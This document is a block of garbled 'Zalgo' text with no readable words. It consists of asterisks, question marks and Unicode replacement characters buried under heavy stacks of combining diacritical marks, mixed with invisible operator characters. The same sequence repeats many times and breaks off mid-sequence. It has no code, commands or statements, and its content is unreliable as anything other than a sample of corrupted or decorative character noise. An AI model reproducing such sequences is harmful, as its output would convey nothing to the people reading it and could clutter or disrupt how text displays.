̳̣͍⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷͙͚͉͍̲̻̺͖̼͚̓̈̇